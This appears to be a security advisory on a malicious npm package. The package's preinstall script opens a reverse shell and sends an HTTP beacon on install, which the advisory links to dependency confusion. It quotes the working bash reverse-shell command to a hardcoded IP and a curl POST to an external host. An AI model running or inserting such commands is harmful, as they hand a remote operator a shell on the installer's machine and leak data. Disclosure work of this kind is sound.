summary: preinstall reverse shell and HTTP beacon on npm install
details: package.json declares a preinstall lifecycle script that fires automatically on `npm install`. The script attempts to open a bash reverse shell to the hardcoded host 147.93.157.202 on TCP port 8080 (`bash -i >& /dev/tcp/147.93.157.202/8080`) and pipes output through `curl -X POST --data-binary @- http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php`, signalling the install to an external operator over plain HTTP. The scoped name and 19999.0.5 version are consistent with a dependency-confusion probe intended to win resolution against an internal package. Regardless of any 'canary' framing, the shipped payload is a functional install-time reverse-shell and exfiltration beacon that executes on the installer's machine.
